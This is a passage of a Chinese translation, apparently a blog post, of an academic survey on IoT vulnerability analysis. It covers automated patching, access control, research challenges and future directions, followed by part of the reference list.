<p>这节所说的自动化生成补丁技术并不专指IoT领域，而是一个传统安全领域的扩展。漏洞修复通常由开发团队在源代码上完成。在获得外部漏洞报告后，他们通过漏洞触发条件和分析漏洞机制来评估漏洞。自动生成补丁可以自动修复软件错误，而不需要开发者人工判断、理解、修正。[^97]<br>
**技术要求：**获得和升级IoT设备固件<br>
软件工程领域的研究者们提出，通过学习正确的c语言[^97,^98]、Java[^99]和其它源代码级别中的正确代码可以自动生成补丁，这一想法取得了初步可行成果。另一种想法是改变程序的形式而不改变它的功能。GenProg[^100]使用了遗传编程的扩展形式来演化程序变体，该变体保留了所需功能但不易受到给定缺陷的影响，然而由于突变操作的随机性，它会生成无意义的补丁。因此Kim等人[^101]提出了基于模式的自动化程序修复（PAR）来解决上述的问题。在安卓平台上，Zhang等人[^102]提出了AdaptKpatch，一个自适应内核修补程序框架和LuaKpatch，它将一个类型安全的动态语言引擎插入内核来执行补丁。这两个方案解决了安卓平台的补丁链过长、碎片化和平台生态布局不匹配、细分修复不及时的问题。然而它们没有考虑解决在跨CPU架构自动进行热修复的问题，他们依旧需要基于知识和经验进行手工编写。DARPA的CGC[^103]引领了在二进制代码级别上的自动化防御方法，然而主要采用的依旧是通用的防御方法，例如二进制代码加固、边界检查和指针修复[^106]</p>
<h4 id="4-5-2-a-name-1-a-访问控制">4.5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>访问控制</h4>
<p>访问控制方法是通过管理IoT设备的用户侧或平台许可，来阻止或结束攻击者的恶意行为。<br>
**技术要求：**用户侧或云端的可扩展性<br>
Fernandes等人[^107]首先深入研究了IoT平台的安全例如SmartThings，他们发现，由于功能粗粒度，大量的应用获得了多余的权限，<br>
智能家居中的许多设备获得了过多的权限，模糊的权限管理，导致了许多针对IoT设备的攻击以及隐私泄露。密歇根大学的研究者们想出了一系列办法来解决这些问题。2016年，他们提出了Flowfence[^108]，一个基于数据流来保护隐私泄露的系统，它将程序分为两部分：（1）一系列负责操作沙箱中敏感数据的隔离的模块。（2）不操作敏感数据，但通过污点跟踪不透明的句柄将隔离的模块链接在一起来协调执行的代码，其中涉及到的数据的数据只能在沙箱内被解引用。于是在2017年，他们又提出了基于上下分信息的ContextIoT[^109]，它可以帮助用户提升访问控制的有效性，通过识别敏感操作上下文标识和保证运行时的上下文完整性，来抵御攻击者进行危险操作。2018年，一个针对智能家居的基于风险控制的模型Tyche[^110]被提出，它建立了访问控制列表（ACCLs），在源代码层面解决访问权限过多的问题。Smartauth[^111]和FACT[^112]同样基于ACCLs，然而他们采取了不同的方法来建立ACCLs。Smartauth通过NLP识别的文件和APP源代码建立ACCLs，FACT在设备开发的阶段就建立了ACCLs。</p>
<!--↑-->
<h2 id="5-a-name-1-a-讨论">5. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>讨论</h2>
<p>在前面几节，我们深入探索了目前关于IoT漏洞分析技术的研究。在这一节，我们首先评估了漏洞分析技术，其次，通过评估指出现阶段研究的难点，最后提出了应对这些难点的技术机会。</p>
<h3 id="5-1-a-name-1-a-评估">5.1. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>评估</h3>
<p>在表3，我们从5个角度进行评估，包括攻击面、技术要求、支持的架构、支持的操作系统和是否与AI结合。在漏洞分析过程中，研究者需要仿真、调试接口、网络流量等方面的技术支持。例如，IoTFuzzer[^57]使用了把目标转移到APP的外围系统分析方法。这种方法优点是能更好的避免架构的复杂性，	缺点是粗粒度的崩溃信息阻碍了对漏洞的进一步分析。从这些角度的的评估能够更容易的对技术难题和未来的发展趋势进行分析。</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193125.png" alt="20210616193125"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616193206.png" alt="20210616193206"></p>
<h3 id="5-2-a-name-1-a-难点">5.2. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>难点</h3>
<p>前面的评估反映出当今IoT设备上的漏洞分析存在的难题。如表4中展示出的，不同技术领域对研究的影响不同，至于IoT设备漏洞分析需要的技术，现存的难题如下：</p>
<ul>
<li>**表4：**这张表总结了难点和机会的影响范围，影响的范围包括四种：IoT分析的基础框架（T1）、漏洞挖掘技术（T2）、漏洞检测技术（T3）、漏洞缓解技术（T4）。√=难点或机会和这个领域的技术有关<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210616202548.png" alt="20210616202548"></li>
</ul>
<h4 id="5-2-1-a-name-1ComplexityandHeterogeneityofDevice-a-（1）设备的复杂性和异构性">5.2.1. <code>&lt;a name='1ComplexityandHeterogeneityofDevice'&gt;&lt;/a&gt;</code>（1）设备的复杂性和异构性</h4>
<p>这个问题一直都是IoT设备漏洞分析技术的最大难点，IoT设备的差异性比PC和手机都大。它使用了多种CPU架构如ARM、MIPS、x86，以及不同的操作系统如Linux、Windows和安卓，它通常使用定制化的固件和内存使用，这使得难以直接在IoT领域应用行业上的自动化检测、挖掘漏洞技术。IoT设备的复杂性使得静态和动态调试更加难以进行。我们发现现阶段主要选择路由器等基于arm的Linux设备来作为研究对象。相似性检测方面的研究扩展到了跨架构的场景[^88-^91,^93-^96]。其他研究并没有遇到这个问题。</p>
<h4 id="5-2-2-a-name-2Limitationsofdeviceresources-a-（2）设备资源的限制">5.2.2. <code>&lt;a name='2Limitationsofdeviceresources'&gt;&lt;/a&gt;</code>（2）设备资源的限制</h4>
<p>由于产品轻量化的需求，IoT设备大多运行在精简的操作系统，或者甚至只在微控制器上运行一个程序。上述原因造成了设备资源有限的特点。对于IoT设备安全测试来说，通过向目标部署相关分析模块，来实现对运行程序外围的监控分析并不容易。安全研究者并不能使用传统的安全分析手段和工具，他们需要重构分析平台。另外，由于设备硬件的计算能力有限，动态分析的性能下降了。最近几年，研究者开发了一套仿真系统，在基础架构[^43-^47]和漏洞挖掘[^56,^60,^64]领域应对了这个问题。然而这个问题还没有完全解决，且会是一个长期的难题。</p>
<h4 id="5-2-3-a-name-3Closed-SourceMeasures-a-（3）闭源措施">5.2.3. <code>&lt;a name='3Closed-SourceMeasures'&gt;&lt;/a&gt;</code>（3）闭源措施</h4>
<p>对于常规的软件，我们可以在源代码或二进制程序层面挖掘或检测漏洞，对于IoT设备制造商，由于他们的闭源措施，这些方法并不能使用。代码审计，例如[^3.3.2]节的&quot;源代码层面的相似性分析&quot;不再适用于IoT漏洞分析。他们甚至对固件进行加密、加强对串行调试接口的身份验证，并且认为这样会更加安全。例如Dlink-882(867,878)、360 clear robots最新的固件都被加密了。因此，基于源代码、固件和调试接口的漏洞分析变得越来越困难。通过之前的评估，我们发现近两年的漏洞挖掘和检测技术已经绕开了调试接口[^59,^60]和固件，然而又出现了信息不完整等问题。</p>
<h3 id="5-3-a-name-1-a-机会">5.3. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>机会</h3>
<p>IoT的特点不仅给漏洞分析带来了难题，同时也带来了新的机会。</p>
<h4 id="5-3-1-a-name-1AI-a-（1）AI技术的应用">5.3.1. <code>&lt;a name='1AI'&gt;&lt;/a&gt;</code>（1）AI技术的应用</h4>
<p>在最近几年，AI和IoT两种新技术已经出现了结合，促进社会进入了AIoT的时代。AI技术的发展也给IoT安全带来了新的措施和解决方案。如今，出现了运用AI进行访问控制[^111]和相似性检测[^89-^91,^93-^96]的研究，随着IoT和AI的发展，新的漏洞挖掘、检测和缓解技术不可避免的出现了，当AI应用在IoT设备上时，这同时也是AI对抗攻击和防御的新机会。例如，攻击者污染智能音箱的数据集，诱导它对某些问题回复一些负面信息（辱骂性词语），而安全研究者们通过改进AI算法来避免这类问题。</p>
<h4 id="5-3-2-a-name-2-a-（2）对第三方和开源代码的依赖">5.3.2. <code>&lt;a name='2'&gt;&lt;/a&gt;</code>（2）对第三方和开源代码的依赖</h4>
<p>IoT固件开发依赖了大量第三方和开源代码，制造商通常只把新功能、高性能和低功耗作为产品的主要目标，同时尽可能缩短开发周期以提升市场竞争力。因此，他们采用了敏捷开发。许多IoT设备制造商直接重复使用开源代、参考公共代码实现、交叉编译PC平台的代码、依赖第三方库。Cui等人[^113]发现80.4%的打印机固件在发布时包含大量已知漏洞，许多最新的固件升级包仍然含有第三方库漏洞，有些漏洞在8年前就已经披露。尽管这件事情暴露了大量安全问题，但仍然带来了独特的漏洞挖掘技术，可以通过不同层次信息的相似性来挖掘同源漏洞。相似性检测也将推动IoT领域的应用程序。</p>
<h4 id="5-3-3-a-name-3-a-（3）外围设备系统的开发">5.3.3. <code>&lt;a name='3'&gt;&lt;/a&gt;</code>（3）外围设备系统的开发</h4>
<p>IoT设备的交互性越来越强，它逐渐提升促进IoT外围设备的发展。IoT设备通常使用终端（PC和手机）、云端和其他系统进行交互。这不仅增加了新的攻击面，同时有助于外围设备分析技术的发展，以解决固件提取集和分析的困难。例如，现有的IoTFuzzer[^57]和访问控制框架[^108-^112]都具备对于外围系统的自动分析和保护技术。</p>
<h2 id="6-a-name-1-a-研究方向">6. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>研究方向</h2>
<p>在前面几节中，我们介绍了面临的难题和机会，我们发现IoT漏洞挖掘、检测和环节技术延续了传统安全研究的轨道，但同时也有其不同的研究方向。</p>
<ul>
<li><strong>基于AI的漏洞挖掘和分析技术</strong>不论是在功能还是安全上，IoT和AI技术都在迅速结合。现有的AI技术成功运用在了漏洞检测上。随着研究的继续，AI会扩展到其他的漏洞分析技术上。例如，GANs[^114]已经应用在了IoT系统异常行为检测上[^115]。在未来，GANs或许可以应用在IoT漏洞挖掘领域，因为它可以学习不同的攻击场景，来生成类似0day攻击的样本，并为算法提供一系列现有攻击外的样本。</li>
<li><strong>大规模漏洞检测技术</strong>在4.2节中提到，IoT设备的复杂性和异构性妨碍了大规模、自动化的漏洞分析技术研究。然而，这个技术需求在IoT安全产业已经迫在眉睫。安全研究者需要一个跨平台方案来克服这个问题，这也是一个长期的研究方向。</li>
<li><strong>自动化漏洞利用</strong><br>
为了利用IoT设备中的漏洞并保护设备免受入侵，我们需要自动化生成poc，因为它能帮助更好理解漏洞的危害和成因。随着IoT领域的发展，自动化攻击和防御也将成为热点。</li>
<li><strong>外围设备的漏洞分析</strong><br>
通过之前对现有难题的分析，我们发现难以通过静态和动态分析直接分析设备。IoT设备的交互性变得越来越强，不仅与外围系统结合的漏洞会越来越多，对外围系统的分析方法的研究也会增加。</li>
<li><strong>在二进制代码层面自动生成多平台补丁</strong><br>
由于一些IoT厂商将代码闭以及和不注重安全性，设备固件没有办法及时打上补丁。为此，我们需要跨平台二进制代码漏洞自动化修复方案。自动化生成二进制代码层的补丁需要完全理解Bug的成因和消除方法。如果我们完全依赖该领域专家的知识，将会出现数以千计的安全漏洞模板，因此难以达成可扩展且可行的解决方案。同时，操作系统和硬件架构的多样性也带来了技术上的难题。解决自动生成多平台的二进制代码补丁这一难题，将是全安全领域一个长期的目标。</li>
</ul>
<h2 id="7-a-name-1-a-结论">7. <code>&lt;a name='-1'&gt;&lt;/a&gt;</code>结论</h2>
<p>随着IoT的迅速发展，确保用户的安全和隐私保护带来了显著的影响和挑战。虽然关于IoT设备安全的研究数量逐渐上升，但在信息安全的领域仍然处于起始阶段。因此，需要一个对于现有研究的综合摘要来指引IoT安全的发展。这篇论文分析了消费者层和产业层的IoT设备架构和攻击面，展示了当前研究的背景。我们首先从四个方面完善了分类：分析工具、漏洞挖掘、漏洞检测和漏洞缓解。基于这四个方面，我们回顾了漏洞分析的技术。另外，我们总结了目标、特点和研究方向。随后，我们评估了漏洞分析的技术，发现现有研究面临的难点，包括设备的复杂性和异构性、设备资源的限制、长期闭源的措施。困难同样伴随着机会。AI技术和外围设备分析将会广泛应用在IoT安全领域。在未来，将会有越来越多的技术和新领域结合，来实现大规模、跨架构的自动化漏洞分析。</p>
<h2 id="8-参考">8. 参考</h2>
<p>[^1]: Lueth, K.L. State of the IoT 2018: Number of IoT Devices Now at 7B—Market Accelerating. Available online:<span class="exturl" data-url="aHR0cHM6Ly9Jb1QtYW5hbHl0aWNzLmNvbS9zdGF0ZS1vZi10aGUtSW9ULXVwZGF0ZS1xMS1xMi0yMDE4LW51bWJlci1vZi1Jb1QtZGV2aWNlcy1ub3ctN2Iv">https://IoT-analytics.com/state-of-the-IoT-update-q1-q2-2018-number-of-IoT-devices-now-7b/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^2]: Rawlinson, K. Internet of Things Research Study. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3c4LmhwLmNvbS91cy9lbi9ocCVFRiVCRiVCRW5ld3MvcHJlc3MtcmVsZWFzZS5odG1sP2lkPTE3NDQ2NzY=">https://www8.hp.com/us/en/hp￾news/press-release.html?id=1744676<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^3]: Wikipedia. Mirai(malware). Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWlyYWlfKG1hbHdhcmUp">https://en.wikipedia.org/wiki/Mirai_(malware)<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^4]: Trevor, H. Internet of Things (IoT) History. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cucG9zdHNjYXBlcy5jb20vSW9ULWhpc3Rvcnkv">https://www.postscapes.com/IoT-history/<i class="fa fa-external-link-alt"></i></span>(accessed on 6 December 2019).Future Internet 2019, 12, 27 18 of 23</p>
<p>[^5]: Gan, G.; Lu, Z.; Jiang, J. Internet of things security analysis. In Proceedings of the International Conference on Internet Technology and Applications, Wuhan, China, 16–18 August 2011.</p>
<p>[^6]: Suo, H.; Wan, J.; Zou, C.; Liu, J. Security in the internet of things: A review. In Proceeding of the International Conference on Computer Science and Electronics Engineering, Hangzhou, China, 23–25 March 2012.</p>
<p>[^7]: Zhao, K., Ge; L. A survey on the internet of things security. In Proceedings of the 2013 Ninth International Conference on Computational Intelligence and Security, Leshan, China, 14–15 December 2013.</p>
<p>[^8]: Pescatore, J.; Shpantzer, G. Securing the Internet of Things Survey; SANS Institute: Bethesda, MD, USA, 2014;pp. 1–22.</p>
<p>[^9]: Balte, A.; Kashid, A.; Patil, B. Security issues in Internet of things (IoT): A survey. Int. J. Adv. Res. Comput.Sci. Softw. Eng. 2018, 5, 450–455.</p>
<p>[^10]: Ngu, A.H.; Gutierrez, M.; Metsis, V.; Nepal, S.; Sheng, Q.Z. IoT middleware: A survey on issues and enabling technologies. IEEE Int. Things J. 2016, 4, 1–20. [CrossRef]</p>
<p>[^11]: Yang, Y.; Wu, L.; Yin, G.; Li, L.; Zhao, H. A survey on security and privacy issues in Internet-of-Things. IEEE Int. Things J. 2017, 4, 1250–1258. [CrossRef]</p>
<p>[^12]: Alaba, F.A.; Othman, M.; Hashem, I.A.T.; Alotaibi, F. Internet of Things security: A survey. J. Net. Comput.Appl. 2017, 88, 10–28. [CrossRef]</p>
<p>[^13]: Zhang, Z.K.; Cho, M.C.Y.; Wang, C.W.; Hsu, C.W.; Chen, C.K.; Shieh, S. IoT security: ongoing challenges and research opportunities. In Proceedings of the 7th IEEE International Conference on Service-Oriented Computing and Applications, Matsue, Japan, 17–19 November 2014.</p>
<p>[^14]: Mahmoud, R.; Yousuf, T.; Aloul, F.; Zualkernan, I. Internet of things (IoT) security: Current status, challenges and prospective measures. In Proceedings of the 10th International Conference for Internet Technology and Secured Transactions (ICITST), London, UK, 14–16 December 2015.</p>
<p>[^15]: Fernandes, E.; Rahmati, A.; Eykholt, K.; Prakash, A. Internet of things security research: A rehash of old ideas or new intellectual challenges. IEEE Secur. Priv. 2017, 15, 79–84. [CrossRef]</p>
<p>[^16]: Al-Garadi, M.A.; Mohamed, A.; Al-Ali, A.; Du, X.; Guizani, M. A survey of machine and deep learning methods for internet of things (IoT) security. arXiv 2018, arXiv:1807.11023. Available online: <span class="exturl" data-url="aHR0cHM6Ly9hcnhpdi5vcmcvYWJzLzE4MDcuMTEwMjM=">https://arxiv.org/abs/1807.11023<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^17]: Alrawi, O.; Lever, C.; Antonakakis, M.; Monrose, F. Sok: Security evaluation of home-based IoT deployments. In Proceedings of the IEEE Symposium on Security and Privacy (SP), San Francisco, CA, USA, 19–23 May 2019.</p>
<p>[^18]: Xie, W.; Jiang, Y.; Tang, Y.; Ding, N.; Gao, Y. Vulnerability detection in IoT firmware: A survey. In Proceedings of the IEEE 23rd International Conference on Parallel and Distributed Systems (ICPADS), Shenzhen, China, 15–17 December 2017.</p>
<p>[^19]: Zheng, Y.; Wen, H.; Cheng, K.; Song, Z.W.; Zhu, H.S.; Sun, L.M. A Survey of IoT Device Vulnerability Mining Techniques. J. Cyber Secur. 2019, 4, 61–75. [CrossRef]</p>
<p>[^20]: Samsung. Samsung SmartThings. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc21hcnR0aGluZ3MuY29tLw==">https://www.smartthings.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^21]: Google. Google Weave Project. Available online: <span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2VhdmUv">https://developers.google.com/weave/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^22]: Apple Inc. Apple HomeKit. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy5hcHBsZS5jb20vaW9zL2hvbWUv">http://www.apple.com/ios/home/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^23]: Home, A. Home Assistant. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuaG9tZS1hc3Npc3RhbnQuaW8=">https://www.home-assistant.io<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^24]: Mi Inc. IoT Developer Platform. Available online: <span class="exturl" data-url="aHR0cHM6Ly9Jb1QubWkuY29tLw==">https://IoT.mi.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^25]: WiFi, A. WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cud2ktZmkub3JnLw==">https://www.wi-fi.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^26]: Zigbee, A. Zigbee. Available online: <span class="exturl" data-url="aHR0cHM6Ly96aWdiZWUub3JnLw==">https://zigbee.org/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^27]: Bluetooth Technology Website. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmx1ZXRvb3RoLmNvbS8=">https://www.bluetooth.com/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^28]: Liu, X.; Zhou, Z.; Diao, W.; Li, Z.; hang, K. When good becomes evil: Keystroke inference with smartwatch. In Proceedings of the 22nd ACM SIGSAC Conference on Computer and Communications Security, Denver, CO, USA, 12–16 October 2015.</p>
<p>[^29]: Das, A.; Borisov, N.; Caesar M. Do you hear what i hear?: Fingerprinting smart devices through embedded acoustic components. In Proceedings of the ACM SIGSAC Conference on Computer and Communications Security, Scottsdale, AZ, USA, 3–7 November 2014. Future Internet 2019, 12, 27 19 of 23</p>
<p>[^30]: Vasyltsov, I.; Lee, S. Entropy extraction from bio-signals in healthcare IoT. In Proceedings of the 1st ACM Workshop on IoT Privacy, Trust, and Security, Singapore, 14 April 2015.</p>
<p>[^31]: McCann, D.; Eder, K.; Oswald, E. Characterising and comparing the energy consumption of side channel attack countermeasures and lightweight cryptography on embedded device. In Proceedings of the International Workshop on Secure Internet of Things (SIoT), Vienna, Austria, 21–25 September 2015.</p>
<p>[^32]: Stokes, P., SentinelOne. Checkm8: 5 Things You Should Know about the New Ios Boot Rom Exploit. Available online: <span class="exturl" data-url="aHR0cHM6Ly93d3cuc2VudGluZWxvbmUuY29tL2Jsb2cvY2hlY2ttOC01LXRoaW5ncy15b3Utc2hvdWxkLWtub3ctbmV3LWlvcy1ib290JUVGJUJGJUJFcm9tLWV4cGxvaXQv">https://www.sentinelone.com/blog/checkm8-5-things-you-should-know-new-ios-boot￾rom-exploit/<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^33]: MITRE Corp. Marvell WiFi. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3Zla2V5LmNnaT9rZXl3b3JkPStNYXJ2ZWxsK1dpRmk=">https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=+Marvell+WiFi<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^34]: Paganini, P. Million of Telestar Digital GmbH IoT Radio Devices Can Be Remotely Hacked. Available online:<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eWFmZmFpcnMuY28vd29yZHByZXNzLzkxMDY5L2hhY2tpbmcvdGVsZXN0YXItSW9ULXJhZGlvLWRldmljZXMtaGFjay5odG1s">https://securityaffairs.co/wordpress/91069/hacking/telestar-IoT-radio-devices-hack.html<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^35]: MITRE Corp. CVE-2019-13473. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3Mw==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13473<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^36]: MITRE Corp. CVE-2019-13474. Available online: <span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4vY3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAxOS0xMzQ3NA==">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13474<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^37]: Costa Gondim, J.J.; de Oliveira Albuquerque, R.; Clayton Alves Nascimento, A.; García Villalba, L.J.;Kim, T.H. A methodological approach for assessing amplified reflection distributed denial of service on the internet of things. Sensors 2016, 16, 1855. [CrossRef] [PubMed]</p>
<p>[^38]: Wikipedia. Constrained Application Protocol. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kv">https://en.wikipedia.org/wiki/<i class="fa fa-external-link-alt"></i></span> Constrained_Application_Protocol (accessed on 6 December 2019).</p>
<p>[^39]: UPnP Corp. UPnP Device Architecture 1.0. Available online: <span class="exturl" data-url="aHR0cDovL3d3dy51cG5wLm9yZy9zcGVjcy9hcmNoL1VQblAlRUYlQkYlQkVhcmNoLURldmljZUFyY2hpdGVjdHVyZS12MS4wLTIwMDgwNDI0LnBkZg==">http://www.upnp.org/specs/arch/UPnP￾arch-DeviceArchitecture-v1.0-20080424.pdf<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^40]: Li, C.; Cai, Q.; Li, J.; Liu, H.; Zhang, Y.; Gu, D.; Yu, Y. Passwords in the Air: Harvesting Wi-Fi Credentials from SmartCfg Provisioning. In Proceedings of the 11th ACM Conference on Security &amp; Privacy in Wireless and Mobile Networks, Stockholm, Sweden, 18–20 June 2018.</p>
<p>[^41]: Zhou, W.; Jia, Y.; Yao, Y.; Zhu, L.; Guan, L.; Mao, Y.; Zhang, Y. Phantom Device Attack: Uncovering the Security Implications of the Interactions among Devices, IoT Cloud, and Mobile Apps. arXiv 2018, arXiv:1811.03241.</p>
<p>[^42]: Vasile, S.; Oswald, D.; Chothia, T. Breaking All the Things—A Systematic Survey of Firmware Extraction Techniques for IoT Devices. In Proceedings of the International Conference on Smart Card Research and Advanced Applications, Montpellier, France, 12–14 November 2018.</p>
<p>[^43]: Zaddach, J.; Bruno, L.; Francillon, A.; Balzarotti, D. AVATAR: A Framework to Support Dynamic Security Analysis of Embedded Systems’ Firmwares. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 23–26 February 2014.</p>
<p>[^44]: Kammerstetter, M.; Platzer, C.; Kastner, W. Prospect: peripheral proxying supported embedded code <span class="exturl" data-url="aHR0cDovL3Rlc3RpbmcuSW4=">testing.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 9th ACM Symposium on Information, Computer and Communications Security, Kyoto, Japan, 3–6 June 2014.</p>
<p>[^45]: Koscher, K.; Kohno, T.; Molnar, D. SURROGATES: Enabling Near-Real-Time Dynamic Analyses of Embedded Systems. In Proceedings of the 9th USENIX Workshop on Offensive Technologies (WOOT 15), Washington, DC, USA, 10–11 August 2015.</p>
<p>[^46]: Muench, M.; Nisi, D.; Francillon, A.; Balzarotti, D. Avatar 2: A Multi-target Orchestration Platform. In Proceedings of the Workshop on Binary Analysis Research (colocated with NDSS Symposium), San Diego, CA, USA, 18 February 2018.</p>
<p>[^47]: Chen, D.D.; Woo, M.; Brumley, D.; Egele, M. Towards Automated Dynamic Analysis for Linux-based Embedded Firmware. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 21–24 February 2016.</p>
<p>[^48]: Bellard, F. QEMU, a fast and portable dynamic translator. In Proceedings of the USENIX Annual Technical Conference, Anaheim, CA, USA, 10–15 April 2005.</p>
<p>[^49]: Wikipedia. Fuzzing. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRnV6emluZw==">https://en.wikipedia.org/wiki/Fuzzing<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019). Future Internet 2019, 12, 27 20 of 23</p>
<p>[^50]: Wikipedia. Taint Checking. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvVGFpbnRfY2hlY2tpbmc=">https://en.wikipedia.org/wiki/Taint_checking<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^51]: King, J.C. Symbolic execution and program testing. Commun. ACM 1976, 19; 385–394. [CrossRef]</p>
<p>[^52]: Alimi, V.; Vernois, S.; Rosenberger, C. Analysis of embedded applications by evolutionary <span class="exturl" data-url="aHR0cDovL2Z1enppbmcuSW4=">fuzzing.In<i class="fa fa-external-link-alt"></i></span> Proceedings the 2014 International Conference on High Performance Computing &amp; Simulation (HPCS), Bologna, Italy, 21–25 July 2014.</p>
<p>[^53]: Kamel, N.; Lanet, J.L. Analysis of HTTP protocol implementation in smart card embedded web server. Int. J. Inf. Netw. Security (IJINS) 2013, 2, 417. [CrossRef]</p>
<p>[^54]: Koscher, K.; Czeskis, A.; Roesner, F.; Patel, S.; Kohno, T.; Checkoway, S.; McCoy, D.; Kantor, B.; Anderson, D;Shacham, H.; et al. Experimental security analysis of a modern automobile. In Proceedings of the IEEE Symposium on Security and Privacy (SP), Berkeley, CA, USA, 16–19 May 2010.</p>
<p>[^55]: Lee, H.; Choi, K.; Chung, K.; Kim, J.; Yim, K. Fuzzing can packets into automobiles. In Proceedings of the 29th International Conference on Advanced Information Networking and Applications, Gwangiu, Korea,24–27 March 2015.</p>
<p>[^56]: Wikipedia. CAN bus. Available online: <span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ0FOX2J1cw==">https://en.wikipedia.org/wiki/CAN_bus<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^57]: Chen, J.; Diao, W.; Zhao, Q.; Zuo, C.; Lin, Z.; Wang, X.; Lau, W.C.; Sun, M.; Yang, R.; Zhang, K. IoTfuzzer:Discovering Memory Corruptions in IoT through App-Based Fuzzing. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^58]: Costin, A.; Zarras, A.; Francillon, A. Automated dynamic firmware analysis at scale: A case studyon embedded web interfaces. In Proceedings of the 11th ACM on Asia Conference on Computer and Communications Security, Xi’an, China, 30 May–3 June 2016.</p>
<p>[^59]: Srivastava, P.; Peng, H.; Li, J.; Okhravi, H.; Shrobe, H.; Payer, M. FirmFuzz: Automated IoT Firmware Introspection and Analysis. In Proceedings of the 2nd International ACM Workshop on Security and Privacy for the Internet-of-Things, London, UK, 15 November 2019.</p>
<p>[^60]: Zheng, Y.; Davanian, A.; Yin, H.; Song, C.; Zhu, H.; Sun, L. FIRM-AFL: high-throughput greybox fuzzing of IoT firmware via augmented process emulation. In Proceedings of the 28th USENIX Security Symposium (USENIX Security 19), Santa Clara, CA, USA, 14–16 August 2019.</p>
<p>[^61]: Zalewski, M. American Fuzzy Lop. Available online: <span class="exturl" data-url="aHR0cDovL2xjYW10dWYuY29yZWR1bXAuY3gvYWZs">http://lcamtuf.coredump.cx/afl<i class="fa fa-external-link-alt"></i></span> (accessed on 6 December 2019).</p>
<p>[^62]: Muench, M.; Stijohann, J.; Kargl, F.; Francillon, A.; Balzarotti, D. What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices. In Proceedings of the Network and Distributed System Security (NDSS) Symposium, San Diego, CA, USA, 18–21 February 2018.</p>
<p>[^63]: Dolan-Gavitt, B.; Hodosh, J.; Hulin, P.; Leek, T.; Whelan, R. Repeatable reverse engineering with <span class="exturl" data-url="aHR0cDovL1BBTkRBLklu">PANDA.In<i class="fa fa-external-link-alt"></i></span> Proceedings of the 5th Program Protection and Reverse Engineering Workshop, Los Angeles, CA, USA,15 December 2015.</p>
<p>[^64]: Costin, A.; Zaddach, J.; Francillon, A.; Balzarotti, D. A large-scale analysis of the security of embedded firmwares. In Proceedings of the 23rd USENIX Security Symposium (USENIX Security 14), San Diego, CA, USA, 20–22 August 2014.</p>
